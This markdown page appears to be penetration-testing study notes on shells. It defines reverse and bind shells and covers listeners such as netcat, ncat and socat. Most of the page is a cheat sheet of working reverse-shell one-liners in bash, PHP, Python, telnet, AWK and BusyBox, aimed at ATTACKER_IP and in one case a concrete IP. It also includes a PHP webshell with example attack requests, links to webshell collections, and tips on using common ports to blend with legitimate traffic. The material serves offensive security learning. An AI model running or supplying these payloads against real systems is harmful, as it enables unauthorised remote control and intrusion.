---
title: Shells
sidebar_position: 3
description: Different types of shells.
---

## Introduction
- Shell is a software to interact with the OS.
- Different terms used after obtaining a shell are
    - **Remote system control:** Executing commands remotely through the shell.
    - **Privilege escalation:** Escalating the privileges to more elevated or admin access.
    - **Data exfiltration:** Using the obtained shell to read sensitive data.
    - **Persistence and maintenance access:** Maintaining the access for later use.
    - **Post exploitation activities:** Actions performed after exploitation such as deploying malware, deleting information, creating hidden accounts, etc.
    - **Pivoting:** Accessing other systems on the network using the compromised.

## Reverse Shell
- Initiates connection from the target machine to an attacker's machine.
- Also known as connect back shell.

## How Reverse Shells Work?

### Setup Netcat Listener
```
nc -lvnp 443
```
- `-l` - Indicates netcat to listen for the connection.
- `-v` - Enables verbose mode.
- `-n` - Prevents connections from using DNS for lookup and forces to use IP address.
- `-p` - Port to be used.
- Use known ports such as 53, 80, 8080, 443, 139, or 445 to blend with legitimate traffic.

### Gaining Reverse Shell Access
- After setting the listener, the attacker executes a reverse shell payload which uses a vulnerability to expose a shell through network.
- One such reverse shell is pipe reverse shell.
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
- `rm -f /tmp/f` - Removes existing named pipe file to create a new named pipe file without conflicts.
- `mkfifo /tmp/f` - Creates a named pipe or first in first out at /tmp/f which allows two way communication between processes.
- `cat /tmp/f` - Reads data from the names pipe.
- `| bash -i 2>&1` - Pipes the data to a bash shell which allows the attacker to execute commands interactively. 2>&1 redirects standard error to standard output.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - Pipes the shell's output to netcat instance running on attacker's machine.
- `>/tmp/f` - Sends the output of the commands to named pipe allowing bidirectional data transfer.

## Bind shell
- Bind shell will bind a port on the compromised system and listen for a connection.
- This method can be used when the compromised target does not allow outgoing connections.
- Less popular since it needs to remain active and listen for connections, which can lead to detection.

### How bind shells work?
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
- `| nc -l 0.0.0.0 8080` - Starts netcat on listening mode on port 8080.
- **Note:** Any ports below 1024 would require admin privileges. 

### Attacker connecting to the shell
- An attacker can then connect to the bind shell using the below command.

    ```
    nc -nv TARGET_IP 8080
    ```

## Shell Listeners
- There are other shell listeners apart from netcat. Few of them are listed below.

### Rlwrap
- Small utility that uses GNU readline library to provide editing keyboard and history.
- Netcat can be enhanced with rlwrap using the below command.
    ```
    rlwrap nc -lvnp 443
    ```
- This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.

### Ncat
- Ncat is an improved version of netcat allowing features like SSL encryption.
    ```
    ncat -lvnp 4444
    ```
- To enable ssl encryption
    ```
    ncat --ssl -lvnp 4444
    ```

### Socat
- Creates a socket connection between two data sources, in this case, two different hosts.
    ```
    socat -d -d TCP-LISTEN:443 STDOUT
    ```
    - `-d` - Verbose output.
    - `-d -d` - Increases the verbosity.
    - `TCP-LISTEN:443` - Creates a TCP connection on port 443.
    - `STDOUT` - Redirects any incoming data to the terminal.

## Shell Payloads
- A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.

### Normal Bash Reverse Shell

- This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.

```
 bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

### Bash Read Line Reverse Shell

-This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

### Bash With File Descriptor 196 Reverse Shell

- This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

### Bash With File Descriptor 5 Reverse Shell

- Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

```
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP Reverse Shell Using the exec Function

- This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.

```
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

### PHP Reverse Shell Using the shell_exec Function

- Similar to the previous command, but uses the shell_exec function.

```
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

### PHP Reverse Shell Using the system Function

- This reverse shell employs the system function, which executes the command and outputs the result to the browser.

```
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```

### PHP Reverse Shell Using the passthru Function

- The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.

```
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

### PHP Reverse Shell Using the popen Function

- This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

```
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```

### Python Reverse Shell by Exporting Environment Variables

- This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

```
 export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

### Python Reverse Shell Using the subprocess Module

- This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

### Short Python Reverse Shell

- This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

```
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Telnet

- This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 

```
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

### AWK

- This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

```
 awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### BusyBox

- This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.

```
busybox nc ATTACKER_IP 443 -e sh
```

## Webshell
- A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. 
- A web shell is usually a file containing the code that executes commands and handles files. 
- It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
- An example PHP webshell would look like
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
- The above shell can be saved into a file with the PHP extension, like `shell.php`.
- The shell can be used for vulnerabilities such as Unrestricted File Upload, File Inclusion, Command Injection, etc.
- The shell can be accessed from the location where it is uploaded to such as `http://victim.com/uploads/shell.php`.
- To execute a command such as `whoami` the attacker sends request to `http://victim.com/uploads/shell.php?cmd=whoami`.
- Webshells available online can be viewed here https://www.r57shell.net/index.php. 
- Some of the popular ones are p0wny-shell, b374k shell and c99 shell.

### p0wny-shell
- A minimalistic single-file PHP web shell that allows remote command execution
- Access here: https://github.com/flozz/p0wny-shell

### b374k shell
- A more feature-rich PHP web shell with file management and command execution, among other functionalities.
- Access here: https://github.com/b374k/b374k

### c99 shell
- A well-known and robust PHP web shell with extensive functionality.
- Access here: https://www.r57shell.net/single.php?id=13
